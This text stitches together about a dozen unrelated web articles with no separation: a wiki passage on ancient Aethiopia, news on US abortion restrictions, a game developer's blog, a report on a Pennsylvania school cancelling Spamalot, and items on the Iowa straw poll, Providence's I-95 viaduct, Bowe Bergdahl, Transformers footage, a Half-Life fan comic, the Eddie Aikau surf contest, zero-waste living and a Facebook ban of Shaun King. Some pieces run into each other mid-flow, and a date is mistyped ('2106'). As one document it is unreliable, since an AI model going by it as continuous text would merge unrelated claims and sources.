With regard to the Ethiopians, Strabo indicates that they looked similar to Indians, remarking "those who are in Asia (South India), and those who are in Africa, do not differ from each other."[10] Pliny in turn asserts that the place-name "Aethiopia" was derived from one "Aethiop, a son of Vulcan"[10] [the smith-god Hephaestus[11]]. He also writes that the "Queen of the Ethiopians" bore the title Kandake, and avers that the Ethiopians had conquered ancient Syria and the Mediterranean. Following Strabo, the Greco-Roman historian Eusebius notes that the Ethiopians had emigrated into the Red Sea area from the Indus Valley and that there were no people in the region by that name prior to their arrival.[10]
The first century AD Greek travelogue known as the Periplus of the Erythraean Sea first describes the Horn of Africa littoral, based on its author's intimate knowledge of the area. The Periplus does not mention any dark-skinned "Ethiopians" among the area's inhabitants. They only later appear in Ptolemy's Geographia, but in a region far south, around the "Bantu nucleus" of northern Mozambique. According to John Donnelly Fage, these early Greek documents altogether suggest that the original inhabitants of Azania, the "Azanians", were of the same ancestral stock as the Afroasiatic-speaking populations to the north of them in the ancient Barbara region along the Red Sea. Subsequently, by the tenth century, these original "Azanians" had been replaced by early waves of Bantu settlers.[6]
Greek and medieval literature [ edit ]
Several notable personalities in Greek and medieval literature were identified as Aethiopian, including several rulers, male and female: Memnon and his brother Emathion, King of Arabia. Cepheus and Cassiopeia, parents of Andromeda, were named as king and queen of Aethiopia. Homer in his description of the Trojan War mentions several other Aethiopians. In some cults of the youngest Olympian god, Dionysus, his maternal origins are believed to be Aethiopia.[citation needed] Ptolemy the geographer and other ancient Greek commentators believed that the "Aethiopian Olympus" was where the gods lived when they were not in Greece.[citation needed]

States have passed 288 abortion restrictions in the past five years — an entire quarter of those enacted since the Supreme Court recognized a legal right to abortion.
When the Supreme Court ruled, in the 1973 Roe v. Wade decision, that women had a legal right to abortion, states responded with a wave of restrictions. That year alone, states passed 81 laws that limited abortion access, things like 24-hour waiting periods prior to the procedure or requiring the consent of a woman's spouse.
But the restrictions of 1973 are dwarfed by recent activity. In 2011, states passed 92 abortion restrictions — the most since the nonprofit Guttmacher Institute began keeping count. When you look at things in the aggregate, you see that the past five years account for 27 percent of all abortion passed since Roe took effect.
A Republican takeover of state legislatures helped pro-life groups win
There are two factors that likely contribute to the rise in abortion restrictions. First was the national health reform debate. One of the last sticking points to get resolved there was whether the plans offered on the exchanges would pay for abortions.
In response, President Obama issued an executive order that prohibits tax subsidies from paying for abortions, except in cases of rape and incest. Instead, insurers would need to use the part of the premium paid by individuals to cover pregnancy terminations.
Enough anti-abortion legislators were won over by this executive order to pass Obamacare. Many pro-life groups, however, still contend there isn't a strict enough firewall between the tax subsidies that insurers receive and the abortion claims they pay out.
They took their lobbying efforts to the state legislatures — and found a receptive audience. A few months after Obamacare passed, Republicans took increasing control of state houses. In 2010, Republicans ran 14 state governments. By 2011, that increased to 26.
So by the end of 2010, abortion had become a prominent political issue — and Republicans had more political clout to take action.
20-week bans and targeted regulations of clinics have skyrocketed
Abortion restrictions often come in waves; one state will pass a new type of law, and then others follow. Nebraska, for example, passed the first 20-week abortion bans in 2010. Eight more states have since gone on to enact similar legislation.
Another case: Between 2011 and 2014, the number of states requiring abortion providers to have admitting privileges at a local hospital jumped from two to 11.
The waves of new abortion restrictions tend to cluster around specific approaches to regulation. About half of those enacted since 2011 fall into four categories: bans on abortion at 20 weeks, limitations on insurance coverage of abortion, limitations on medical abortions, and targeted regulations of abortion providers (like the admitting privilege laws).
These are the types of laws that will soon be tested in a pending Supreme Court case, Whole Women's Health v. Texas. That lawsuit argues against a new Texas law that requires abortion clinics to become certified as ambulatory surgical centers, making costly upgrades to their facilities. About half of Texas clinics have closed after this law was enacted in 2013.
These laws have real effects on real people
Researchers at the University of Texas recently surveyed 23 women in the state, who attempted to get abortions in the wake of the new certification law. My colleague Emily Crockett wrote about what they found:
Five of these women had abortion appointments that were abruptly canceled after the clinic closed, 15 tried to make an appointment but were turned away because the clinic had recently closed, and three were Texas residents who ultimately crossed the border into Albuquerque to have their procedure done. Of the 23 women interviewed, two couldn't overcome the financial and logistical obstacles it would have taken to get an abortion somewhere else, so they continued their unwanted pregnancy. Eight women were delayed more than one week. Two sought abortion care in the first trimester, but were delayed so long that they couldn't get an abortion until the second trimester — which is a more expensive and riskier procedure. (Second-trimester abortions still only have a 1.3 percent risk of major complications, but that's more than 20 times higher than the risk for a first-trimester abortion.)

Yay! Another video! And another set of comments about said video that I was too lazy to put into the original video itself! Yay!
Known bugs
There are three major ones visible in the video: levitating creatures, which is caused by a minor bug with how the creature finds ground level, the Species Average Thumbnail not working, which I threw a textual tantrum over, and a bug with how Stamina is calculated (did you spot it?). I managed to fix all three of these in between recording and uploading this video.
Energy Graph
Of everything in the UI, the real-time energy graph is the most obviously placeholderish. With a bit more work it will look a lot more professional, with current-moment positive and negative effects and their magnitudes (things like metabolism, walking, eating) shown, and icons applied to sudden drops and jumps (like the ones caused by reproducing in the video).
Genetics
The genetic code you see in the video is genuine: it really is a representation of the creatures genetics, and I have already built the function that allows the player to clone creatures from it.
But with that said, it's sadly not completely analagous to a real organisms genetic code. It has some beguiling similarities, like codons and genes, but it's a ‘code' in every sense of the word: it represents the creatures actual genes, which are a list of numbers. This means it's possible (albeit difficult: it's quite robust, and only going to get more so) to ‘break' the code and make it impossible to compile. Biological DNA is not at all like that: it always codes for something, no matter how much you change it, because it's “compiler” is a physical process.
This difference was implemented for several reasons, but the biggest is probably performance: I doubt I'd be able to run a quarter of the number of creatures I currently can if I was actually using the genestring itself for calculations. It also makes balancing mutation rates easier: eye sizes should mutate a lot faster than overall sizes, for example.
I won't explain the system here and spoil it for any cryoptographers who are interested in trying to decode it, but it's not a particularly complex code.
Genetic Manipulation
This is one of the player-oriented gameplay elements planned for later versions of the game. A lot of thought has been given to how the player will interact with the simulation without completely taking over the ecosystem and directing everything on Gaia, and artificial-selection and genetic manipulation are the two primary elements of this. There will not be a Spore-style creature editor. Don't get me wrong, I thought the creature editor in Spore was brilliant (it might have been the only thing that was), but I'm pretty certain it would take all the fun out of Species if you could just customise ‘your' Species exactly the way you wanted it right from the start.
Alpha Release
Hell yes indeed! I now have a personal deadline to meet, a list of things to achieve, and I have officially made the announcement like we're some sort of proper indie studio or something (fingers crossed nobody figures out we're just some random guy with a laptop and a few friends helping out occasionally). So bar anything catastophic, an Alpha Release (Species 0.4.0) is on the horison and slowly getting bigger.
Free?
Yep. I'm following a slight mutation of the Minecraft get-rich-quick scheme marketing strategy (my plan is probably closer to Kerbal Space Program, which is awesome by the way), which seems to have become something of a de-facto standard for indie game releases. So all the alpha releases (however many of them there are) will be free, while the Beta releases will cost something, and the full releases will cost a bit more, but buying a beta release or preordering during the alpha stage will get you the full version anyway for less money than what you'd pay if you bought later, and the alpha releases will always be free-to-download even after the beta and full versions are- HOW DID SOMETHING THIS COMPLICATED BECOME SO POPULAR?
I might set up donate/pre-order button when I release the first Alpha. I'd feel like a jerk if I took any money without giving you guys something first. 🙂
Hmm… I'm pretty sure that's everything I wanted to cover here.
Thanks for reading!

“No snark today. Too tired from spending all night editing his stupid video for him. Lazy sod.”
Once each year, the world turns its eyes to Williamsport and South Williamsport PA, as young athletes from around the globe compete in the Little League World Series. This year has garnered particular attention for the wunderkind pitcher Mo'ne Davis, whose story has united people across any manner of gender or racial lines, through the talent and grace of a single young woman. Less publicly and widely known, however, was that over this summer, the administration of the South Williamsport Area School District and the town's Junior/Senior High School had been working against the very spirit of inclusion and diversity that is in abundant evidence on the town's ball fields. (My previous reports were posted on July 2 and July 15.)
It was first reported by the local television station WNEP on July 1 that the school principal had canceled plans for a production of the musical Spamalot, slated for the 2014-15 school year. The reason cited, according to drama director Dawn Burch, was the musical's gay content, which includes a same-sex wedding. While a particularly incendiary statement in that initial report, about homosexuality not existing in the community, was attributed to principal Jesse Smith, it was declared inaccurate by all parties, and excised as of July 3.
The Sun Gazette of Williamsport, on July 3, reported that Dr. Mark Stamm, the district superintendent, denied Smith ever made the excised statement, though Stamm never spoke directly to the broader issue of the show being canceled over gay content. He also declared that the production had not been approved according to district policy.
Because Burch, acting on advice of counsel, would not release her communications with Stamm and Smith to corroborate her account, I became one of at least two parties to seek access to the school's internal communications about the show under the State of Pennsylvania's Right To Know Law. I received the materials in question yesterday, August 20; the metered postmark was August 18.
In brief, the materials make clear that Burch was telling the truth about Smith's statements, namely that “homosexual themes” were the reason the show was being rejected, and that despite Stamm's assertions as the story went public, it would seem Burch had very likely gone through the proper channels in seeking approval for the show or at the very least honestly and openly believed that approval had been given.
Cause of Cancelation
Regarding the assertion that Principal Smith had cited gay content as a cause for canceling the show, I quote first from an e-mail Smith sent to Burch on June 27, 2014 at 10:58 am. The first three paragraphs are redacted and only the following can be read:
“Finally, you told me late in the school year that you were looking to perform Spamalot for your spring 2015 musical. I have some concerns such as a guy sending another guy a message on girl's underwear and a gay wedding to be performed. If you are still planning to perform this then we will need to talk.”
A cover letter to the materials provided to me by the school's Open Records Officer – Dr. Stamm – states that six e-mails between Stamm, Smith and/or Burch on the dates June 27 through June 30 were withheld because they contained some combination of a) performance evaluation, b) written criticism of an employee and/or c) identifies child then aged 17 years or less.
Whatever was said in those e-mails aside, Smith sent an e-mail to Burch on June 30, 2014 at 7:27 am asking her to choose a different musical. He questioned the appropriateness of Spamalot as follows:
“I am not comfortable with Spamalot and its homosexual themes for two main reasons: 1. Drama productions are supposed to be community events. They are supposed to be performances that families can attend. To me, this kind of material makes it very hard for this to take place. I don't want families to be afraid of bringing small kids because of the content. I don't want members of the community staying home because they feel the material is too risqué or controversial. 2. I think that choosing productions with this type of material or productions that may be deemed controversial put students in a tough spot. I don't want students to have to choose between their own personal beliefs and whether or not to take part in a production.”
So Mr. Smith feels that love is controversial, that homosexuality is risqué. He feels that people might be afraid of exposing children to it. To that I say: Mr. Smith, your statements condone the homophobic members of your community and seek to consign every gay resident to second-class status. Yet their love is not something to be feared or hidden any more than any romantic relationship of yours or Dr. Stamm's or my own. You are coddling those who would seek to suppress and condemn, instead of setting an example of respect, equality and inclusion.
Yes, by statute Pennsylvania is inconsistent in its position on LGBT issues, in that marriage is legal for all, regardless of the genders of the couple, however the state doesn't yet afford equal rights protection regardless of sexual orientation. But Smith is teaching lessons seemingly drawn from outdated textbooks. The law will catch up soon enough with society, either on the state or federal level, insuring equal rights for all. Stamm's position that Smith's decision regarding Spamalot “is sound” (e-mail from Stamm to Burch, June 30, 2014 at 1:12 PM) can be taken to mean that he condones the same discriminatory attitudes that would erase gay life, in any context, from the school's stage. As an aside: the Motion Picture Association of America's Ratings Board may share the school administration's general view on representing homosexuality, according to critic Stephen Whitty of The Star-Ledger.
Approval of Spamalot
The earliest materials provided to me by the school district are dated June 27. As quoted above, Smith acknowledges that he had a conversation during the school year with Burch about her intention to produce Spamalot, and expresses specific reservations. However, there is no correspondence indicating prior approval, leaving conflicting accounts by Burch and Stamm in the press.
This leads to the very last item in the materials I received: a check dated May 12, 2014 to Theatrical Rights Worldwide, the licensing house, for $1,935, with the note “For Spring Musical – Drama.” It is signed by Jesse Smith. In an statement to me as I began exploring this situation, a representative of Theatrical Rights confirmed to me that an executed license was in place between the company and the school for Spamalot. The school also provided a copy of the Spamalot contract, signed by Burch, dated May 7, along with the check request (which did not specify the show title, only “Spring Musical License/rental/materials).” So how did a check get signed by Smith and sent to the company for a show that ostensibly wasn't approved? Would Burch submit a check request for a musical that hadn't been approved for Smith's signature?
Any school administrator who has any experience in licensing theatrical material is certainly aware that payment is made in advance, not following a production. A Facebook events post shows that the school's 2014 musical, How To Succeed In Business Without Really Trying, was produced in March of this year. So it is exceedingly unlikely the check could have been construed to be payment for that production two months in arrears. The school provided me with check requests and check duplicates for perusal copies of other shows that Burch looked at, perhaps to suggest that there was confusion, but there's only one contract, and the only check other than the one that corresponded to the Spamalot contract that over $100 was the license fee for this fall's play production.
I can draw only two possible conclusions. The first is that Burch had secured the proper approval, albeit verbal, for the production of Spamalot, and Smith's concerns only arose roughly six weeks after he signed a check for the rights. In that case, he was backtracking on his prior approval and Stamm's comments reported on July 3 were either misinformed or willfully meant to obscure the events. It would be very interesting to know what prompted Smith's change of heart, if that is the case. When did Smith discover content he objected to, and how?
The second possibility is that Smith signed a nearly $2,000 check to license a show he hadn't approved. In my training and experience, anyone with financial responsibility is expected to know what they're paying for. A common practice is for a check request, along with either an invoice or a contract (or both) is attached as backup to a check ready for signature. I cannot speak for the business practices of the South Williamsport School District, but if this is the truer of my two scenarios, then it appears Smith didn't follow a fairly standard fiduciary protocol and review the license he was paying for, and now wants to distract from that oversight by blaming Burch, who appears to have been operating openly and in good faith.
Now What?
With Jesse Smith's statements about suppressing the representation of homosexuality at the school now public, perhaps he will speak about the entire situation; he has not done so publicly to date. Both Smith and Stamm should repudiate their positions – and acknowledge the truth of Burch's original assertions – or they must deal with being known as educators who appear to deny the truthful, honest lives and loves of many of their students past, present and future, as well as the LGBT community locally, statewide and even nationally.
From my perspective, I don't understand why, once they knew they had to reveal their positions as a result of the Right-to-Know requests, Stamm and Smith didn't own up to what had taken place and get out ahead of the story with an apology. Instead, they have left it up to me and others to reveal the truth, which will no doubt be picked up and explored by yet more who care deeply about equality in our society. They would do well to immediately consult with local LGBT groups about establishing a Gay-Straight Alliance at the school in the next few months, to demonstrate their commitment to the open acceptance of all of their students. They should also make clear that Burch may produce plays, musicals or both that include “homosexual themes.”
And where does this leave Dawn Burch, a drama director who couldn't quietly accept the administration's exclusionary position and spoke out? Well as this news was first breaking, on July 3, 2014 at 8:39 am, Dr. Stamm wrote to her that, “The feedback we received from the community, both local and national, is being given appropriate consideration. Whether or not you are able to return as the drama director, is a decision that you will have to make.” It is important to note that Burch is a contract employee, not a teacher; she has no tenure. I hope the school system stands by letting her decide her future and that she stays on to run the theatre program, for the benefit of all the students, not just those whose lives find favor with those in power. And no matter what shows she puts on – in correspondence disclosed, she did express a willingness to consider other shows for the coming year, but not without the source and the reason for the change in selection being known – I look forward to visiting South Williamsport to applaud her.
* * *
I e-mailed Dr. Stamm and Mr. Smith last evening at 6:43 pm, asking if they would speak with me on the record about the situation, setting a 9 am deadline. As of 9 am this morning, neither had responded. When I reached Burch by phone last evening, she declined to comment further on the situation. Should any of the parties contact me for an on-the-record conversation subsequent to the publication of this post, I will add to it here or write additional posts as warranted.

DES MOINES, Iowa (Reuters) - The Iowa Republican Party on Friday killed the state's high-profile presidential straw poll, putting an end to a decades-old political tradition that had outlived its usefulness.

The circus-like summer event, planned for August 8, had traditionally served as a test of organizing strength that helped winnow the Republican presidential field in the state that kicks off the White House nominating race.
But several prominent Republicans, including former Florida Governor Jeb Bush and U.S. Senator Marco Rubio of Florida, had ruled out participating in this year's non-binding preference poll. None of the top names in the growing 2106 list of Republican candidates had committed to attending the event, scheduled more than a year before the November 2016 general election.
The Iowa party's state central committee voted unanimously to kill the event in an early morning conference call.
“I've said since December that we would only hold a straw poll if the candidates wanted one, and this year that is just not the case,” Iowa Republican Party Chairman Jeff Kaufmann said in a statement after the vote.
Candidates have grumbled about the time and cost necessary to participate in the straw poll, a fundraiser for the state party that began in 1979. It has been criticized for boosting minor candidates and not reflecting the broader preferences of Iowa Republicans. Winners have not seen any real momentum from their performance.
Neither of the last two straw poll winners - Mitt Romney in 2007 and Michelle Bachmann in 2011 - went on to win the Iowa nominating contest the next year. After her surprise win, Bachmann stumbled to a sixth-place finish in Iowa and soon dropped out of the race.
The last straw poll winner to go all the way was George W. Bush, who went on to capture Iowa, the Republican nomination and the White House in 2000.
The state party had moved the site of this year's straw poll, which traditionally featured speeches by the candidates and tents for each campaign featuring food, music and games, from Ames to nearby Boone, Iowa.
But faced with the prospect of limited participation by candidates, some state activists worried a desultory straw poll would fuel criticism of Iowa's first-in-the-nation status.
“This step, while extremely distasteful for those of us who love the straw poll, is necessary to strengthen our first-in-the-nation status and ensure our future nominee has the best chance possible to take back the White House in 2016,” Kaufmann said.
The estimated cost of the underlying project — replacing the decrepit Route 95 North bridges and interchange in the center of the city while adding new travel lanes — has grown from $226.1 million to $342.9 million.
The price tag to repair and expand Route 95 through downtown Providence has ballooned as Rhode Island looks to take advantage of President Donald Trump's preference for public-private infrastructure partnerships.
The state last month applied for a $60-million grant from the U.S. Department of Transportation's "INFRA" program for the reconstruction of the Route 95 Northbound Providence Viaduct, roughly the same project it sought a $59-million grant for a year ago under the Obama administration's predecessor "FASTLANE" program.
But the estimated cost of the underlying project — replacing the decrepit Route 95 North bridges and interchange in the center of the city while adding new travel lanes — has grown from $226.1 million to $342.9 million, according to the respective grant applications from the Rhode Island Department of Transportation.
A big chunk of that cost increase is connected to financing and the private part of the project. This year's grant application says the "estimated design-build cost" is $264 million. The new plan then adds interest on a $45-million private loan and a "15-percent return to the private partner."
Built in the 1960s, the northbound viaduct carries Route 95 over the Woonasquatucket River, Northeast Corridor rail line and multiple local streets. It's in bad shape.
The DOT says the bridges are in "poor structural condition," carrying more vehicles than they were designed to handle and one section is "fracture critical, necessitating frequent and costly patchwork repairs just to keep it and the surrounding stretch of I-95 functional."
After four years of work, the state completed reconstruction of the southbound Viaduct in July at a cost of $105 million, 16 months behind schedule, according to DOT's latest quarterly report.
Replacing the northbound Viaduct and ramps in their current configuration is projected to cost between $120 million and $170 million, the grant application says.
But DOT leaders consider this part of Route 95 North not only dilapidated, but one of the worst traffic choke points in New England, and they want to redesign the highway with separated local and express lanes to avoid the congestion-causing vehicle weave that happens now.
"We stand on the cusp of a once-in-a-lifetime decision: to alleviate the current ills of [sic] third-most traveled segment of interstate in all of New England, or simply replace the Viaduct in-kind, which would lock in longstanding safety and congestion challenges that currently plague this stretch of I-95 for the next 70 years," DOT Director Peter Alviti Jr. wrote in the grant application.
As in last year's proposal, the new DOT plan would separate local traffic heading for the Route 146 and Orms Street exits from vehicles heading toward Pawtucket and Boston, adding two extra lanes to the narrowest section of the highway.
It also retains an idea devised by Providence planners to tear up the circular Dean Street-Route 6 on-ramp to reclaim 5 acres for potential development and the expansion of the popular DePasquale Square commercial area on Federal Hill.
Gone from last year's Viaduct plan is a $15-million pedestrian bridge over Route 95 between the Providence Place Mall and Promenade Street, which Alviti said last week was removed to save money.
Even with the pedestrian bridge taken out, the estimated cost of the viaduct project jumped 59 percent from a year ago when the new financing plan is taken into account.
"The $226-million figure from the original FASTLANE grant application was a rough estimate for the cost of the project. It is important to remember that this project is still in the very early concept and scoping phase," wrote DOT spokeswoman Lisbeth Pettengill on the reason for the spiraling costs.
Why would the state seek a private partner and use private loans when its own borrowing costs are lower and it is about to see a new stream of bridge repair money from truck tolls?
"When the [Trump] administration came in, they stopped the FASTLANE process and redefined the grant guidelines. The new guidelines encourage states to find private partners and to take more of a role in funding projects," Pettengill wrote. "With these guidelines in mind, we redefined the project to fit those new grant requirements."
Trump has said he will unveil a federal infrastructure plan early in the new year. Based on his campaign proposals, the plan is expected to have a heavy emphasis on public-private partnerships.
Beyond financing, Pettengill said private partners can bring additional assets as well as extra costs.
"This delivery method created additional costs, particularly due to the costs associated with private sector equity funding the project," she wrote. "We are seeking the new grant to offset those costs."
If the state doesn't get a federal grant, Pettengill said the DOT will reevaluate "all options" for the project and its financing, keeping in mind that the viaduct must be replaced at some point.

On Monday's broadcast of “The O'Reilly Factor” on the Fox News Channel, retired Lt. Col. Tony Shaffer of the London Center for Policy Research revealed to host Bill O'Reilly that sources tell him U.S. Army Sgt. Bowe Bergdahl will face charges for desertion.
Bergdahl was held captive by the Taliban-aligned Haqqani network in Afghanistan from June 2009 until his release in May 2014, which was part of a prisoner exchange for five Taliban members who were being held at the detention center at Guantanamo Bay.
“Bill, the Army has come to its conclusion and Bowe Bergdahl,” Shaffer said, “Sgt. Bergdahl will be charged with desertion. I have been told and confirmed by two other sources that his attorney was given what we call a charge sheet. A charge sheet is results of the investigation listing out the articles of the Uniform Code of Military Justice that have been violated. The key violation is desertion. And this is having been done. The decision has been made. Let me be very clear. As a corporate entity, the Army has decided that they want to pursue Bergdahl for this violation.”

Transformers: Age Of Extinction CinemaCon Footage Brings Dinosaurs, Explosions And More By Eric Eisenberg Random Article Blend
After a packed montage full of CGI dinosaurs, a truck – possibly Optimus - driving through the desert, spaceships flying through a city, a massive car chase, and a shot of Stanley Tucci freaking out about being forced to hide in a big glass room, the extended footage began with Cade Yaeger (Mark Wahlberg) pulling up to his farmhouse in a tow truck pulling what looks like a huge hunk of junk. His daughter Tessa (Nicola Peltz) and his employee/partner Lucas (TJ Miller) are waiting for him in the yard, and immediately start yelling at Cade the second he steps out of the cab. It is immediately clear that the Yaegers are having serious money problems and both Tessa and Lucas are upset that Cade would spend money on such a big piece of garbage. The patriarch swears that he'll be able to strip the truck for parts and that it will pay for itself, but his daughter and friend are hardly convinced, and instead argue that Cade wasn't even able to get Tessa a dress for prom. There is concern that our soon-to-be hero isn't responsible enough to care for himself, but he stresses that one day he will build something that matters.
Later that evening Cade is working under the truck in a shed and excitedly calls out to Tessa and Lucas, who come rushing into the "garage." Cade tells them that he has found "not normal steel" in the vehicle, and when he hooks it up to a battery it not only suddenly comes alive but starts to talk, saying, "Calling all Autobots." Rather than matching Cade's excitement, Tessa and Lucas sprint out of the shred at top speed and are absolutely terrified to have an alien presence suddenly in their world. It turns out this fear is just a little bit justified.
The scene then cut to Harold Attinger (Kelsey Grammer) sitting in some kind of government control center where Cade's scrap find is up on a bunch of monitors. After a call to action from Attinger we then see a bunch of federal agents pack into black SUVs and helicopters and make their way out to the Yaeger farm. The leader of the agents, Savoy (Titus Welliver), approaches Cade and his daughter and asks him to reveal the location of the Transformers. Cade makes a snide remark ("You know, there's a saying about people messing with people from Texas"), but this gets a violent reaction from Savoy, who tells his men to attack Tessa. In a flash we then see the Transformer in the shed burst out with guns blazing, saying "Here I am." It doesn't take long for the entire scene to turn to chaos, but Cade and Tessa are rescued when Shane (Jack Raynor) pulls up in his car. As they race away, it's revealed to Cade that Shane is Tessa's boyfriend – which is news that Cade is not very happy to hear.
The next sequence began with Optimus Prime doing battle with Galvatron on an open stretch of road, with Cade, Tessa and Shane at their feet trying not to get squashed by the giant robots. It's revealed that Galvatron is actually a remote-controlled Transformer (being manipulated from a control room by Stanley Tucci's character and a random guy) who was presumably created so that humans would have a weapon against a future alien invasion. While Cade and Shane are able to get to safety, Tessa gets caught in the middle of the fray and can't escape, eventually hiding in a parked car. The scene gets interrupted as a rocket slams into Optimus, knocking him back. We then see where the shot came from: Lockdown, another Transformer, is walking down the road with a giant spaceship behind him. Lockdown's face turns into an absolutely massive gun and Optimus is once again hit by a blast, this time knocking him on top of the car Tessa is in. As the new threats come closer, Lockdown gets back into the ship a tiny vehicle comes flying off of the big one, throwing down a net that captures both Optimus Prime and the car he is lying on. Cade sprints towards the ship and leaps to grab the netting, trying to free his daughter. His attempts are in vain, however, as he is unable to hold on and the aliens fly away. In frustration, Cade slams his fist on the ground in slow motion.
The footage ended with another giant montage featuring all kinds of various action, including more explosive car chases, the main characters swinging down the side of a skyscraper on power lines, and Cade and Savoy having an epic chase across rooftops. The footage ended with a giant piece of alien machinery flying into a busy intersection and crushing a car. Cade exits the giant hunk of metal, and the driver of the car he crushed comes out to complain, saying, "I hope you have insurance." Cade reacts violently to this, and calls to his daughter: "Tessa, hand me my alien gun."

The story takes place in the years after the events of the Black Mesa Resonance Cascade incident during the unknown timeframe when Gordon Freeman is placed into stasis by the G-Man. It follows a group of individuals who are attempting to survive the effects of the incident in America.
What stands out so much about Half-Life: A Place in the West over conventional fan comics is the high quality of graphics presentation, which features hand-drawn illustrations by comic book artists Heath Heil and Rachel Deering. As a result, the work is comparable to Valve's own comic style such as seen in Left 4 Dead's “The Sacrifice” and Portal 2's “LAB RAT“.
You can read the first three pages of the first chapter “Following Portents” on the official website. New pages are expected to be released next Monday (3rd November) and likely at regular intervals after that.

There's a new name marking a new era of the big wave surf competition honoring legendary lifeguard and surfer Eddie Aikau.
We're just weeks away from the opening ceremony of the big wave event.
There's still no word on a sponsor, but the family tells KHON2 that the surfing contest will now be known simply as The Eddie.
The Eddie Aikau Foundation debuted the contest's new poster at its annual essay contest luncheon.
For the first time in three decades, the big wave event will not be sponsored by Quiksilver after the family and the company couldn't reach an agreement.
Though they have parted ways, the Aikau family tells KHON2 there's nothing but gratitude for the former sponsor.
"I do wanna thank Quiksilver for all the years. The family is just moving on with the tremendous support from the public and from Hawaii," Clyde Aikau said.
Without announcing a new sponsor, many are wondering if the contest will still happen this season.
The family says the opening ceremony is still scheduled for November 30, and for now the family remains optimistic.
"Yes, we're gonna continue that because that's been the tradition," Sol Aikau said. "All I'm gonna say is being ready to come down to the bay when you hear it."
"Even if we have to have coconuts for trophies and you come down with a can of sardines, Uncle Clyde will feed you rice and we'll have the event," Clyde Aikau said. "It's just a whole new road and a very exciting road, and the main thing is that the family wants to continue to carry on Eddie's legacy and what he was all about."
KHON2 will keep you posted on what happens with The Eddie.
Katelin Leblond is about to crack the lid on her fourth garbage jar in 2018 — which shows how little waste she, her husband and her two children produce.
Each year since 2014, one recycled 1.5-litre glass container is all the Victoria woman has needed to collect what her family hasn't been able to divert otherwise.
"I really do care about my personal impact on the planet," she said, adding that it was a daunting commitment at first. "I cared but I wasn't walking the talk and wasn't walking the talk because I didn't know what to do."

Living a zero-waste lifestyle means consuming less, but also finding ways to dispose of your trash by either recycling, reusing or composting.
The good news is that more people than ever are making an effort. The bad news is that there is still too much that could be recycled that's ending up in the garbage.
Metro Vancouver — the federation of 21 municipalities, one electoral area and Tsawwassen First Nation — wants to keep 80 per cent of all waste out its landfills by 2020. Currently only about 60 per cent is recycled.
It says organic waste, such as food scraps, still makes up the biggest portion of garbage — nearly a third — even though there is a ban on tossing food scraps into garbage bins and programs in place to compost it.
Although 90 per cent of apartment buildings or condos in Metro Vancouver have compost bins, only 20 per cent of compostable organics and paper is being recycled from this type of housing.
At a landfill, those items create methane, which is a potent greenhouse gas that contributes to climate change, according to Metro Vancouver.
The City of Vancouver's landfill in Delta accepted 382,711 tonnes of municipal solid waste in 2015 along with 124,044 tonnes of demolition waste. (CBC)
Regions across Canada, like Metro Vancouver, need residents to do more to meet waste goals.
"A lot of times what we tell people is don't throw it out — call us first," said Harvinder Aujala who works for the Recycling Council of B.C. or RCBC.
Its primary role is to help residents figure out what to do with items once they are no longer useful, rather than just dumping them in the garbage or — even worse — in alleys or at the side of the road.
Metro Vancouver says illegal dumping in the region is costing municipalities $5 million a year. It says many people dump because they don't know what else to do with big, bulky items. (Tina Lovegreen/CBC)
RCBC runs a hotline (604-RECYCLE or 1-800-667-4321) and has a smartphone app in addition to its website for people to inquire about recycling.
Since 2014 calls have gone from around 50,000 a year to more than 85,000, while website visits and use of the app have also grown exponentially.
How do I get rid of this? # inquiries to <a href="https://twitter.com/RecyclingBC?ref_src=twsrc%5Etfw">@RecyclingBC</a> about keeping items from landfills — 2014: 165,724 / 2015: 236,520 / 2016: 238,519.

Aujala says people are becoming more savvy about the potential of recycling.
"If somebody calls with an item that isn't recyclable a lot of times they're quite surprised," she said. "They're willing even to hold onto it for the potential that maybe there will be a recycling program in the future."
Leblond says making the effort to reduce waste and divert what you do make is good for the environment, helps saves money and even contributes to well-being by making life more simple.
"You have to find your why and for me it started out with the environment and I needed to feel like I was doing my part," she said.
While Leblond can count on two hands the number of times since 2014 she has bought her family a bag of chips — the bags are difficult to recycle — she encourages anyone to adopt zero waste at a level that's comfortable.
"I think that there is a lot of fear in change and people resist but you've just got to try it," she said.

The ban against Shaun King, which was revoked as a ‘mistake' hours later, is the latest incident of site censoring users following Vietnam war photo removal
Facebook temporarily banned a well-known Black Lives Matter activist and writer who posted a racist message he received, raising fresh questions about the way the social media site censors journalists.
Shaun King – a senior justice writer for the New York Daily News, who frequently writes viral stories about police brutality – posted on his Facebook page a screenshot of an email that twice called him the N-word, saying “FUCK YOU N*****!” The technology corporation said it was blocking him from posting for 24 hours, saying he had violated its “community standards”.
The ban, which Facebook later revoked and said was a mistake, comes amid a heated debate about the questionable editorial policies of the company, which now plays a major role in how people consume news.
Facebook faced international scorn last week when it censored a Norwegian writer's post featuring the historic Vietnam war photo of nine-year-old Kim Phuc running naked from a napalm attack. Journalists criticized the decision, saying the Pulitzer-winning image had clear news value, and Norway's largest newspaper published a front-page letter to CEO Mark Zuckerberg, urging him to live up to his role as “the world's most powerful editor”.
After the intense backlash, Facebook reinstated the photo, but media ethicists said the spat exposed fundamental flaws and unresolved challenges in the way the company controls the news. While Zuckerberg continues to insist that his corporation is a “platform” and “tech company” – and not a media site or publisher – the reality is that Facebook has become a primary news source for many users and a vital tool for reporters.
Facebook's expanding power in the media business has created anxiety for news publishers, who have lost ad revenue as a result and have lamented how Facebook's algorithms can drive or kill traffic to news sites.
The temporary ban against King offers a reminder of how much control Facebook has – and how the site doesn't always get it right when choosing what content to allow or reject.
“I love Facebook. It's a huge part of what I do every day,” King said in an interview. “Facebook is as important to me as my laptop.”
So when King saw he could no longer post, it was startling.
“This thing that I had taken 10 years to build, this community with over 800,000 people … to think that with a keystroke or a computer filter, that could be shut down, it's a weird feeling.”

Yeah, really.

King, who was a guest speaker at Facebook earlier this year to discuss Black Lives Matter, said he reached out directly to people he knows at the Silicon Valley company.
He said that roughly six or seven hours after he was banned, the company restored his access. Facebook wrote to him: “This was a mistake, and we sincerely apologize for the error.” A team member had “accidentally” removed his post, the message said.
For regular users without direct connections to Facebook, the outcome could have been different, King said.
“A lot of people who do exactly what I did get suspended, and they don't have somebody to contact. Sometimes, they're suspended for several days, weeks or months.”
After the war photo dispute last week, journalism experts argued that Facebook needs trained editors and reporters to handle the tough ethical decisions that newsrooms typically make, and many have pointed out that the company's algorithms are insufficient.
When Facebook recently fired a team that managed its “trending” section, the site's algorithm started promoting fake stories.
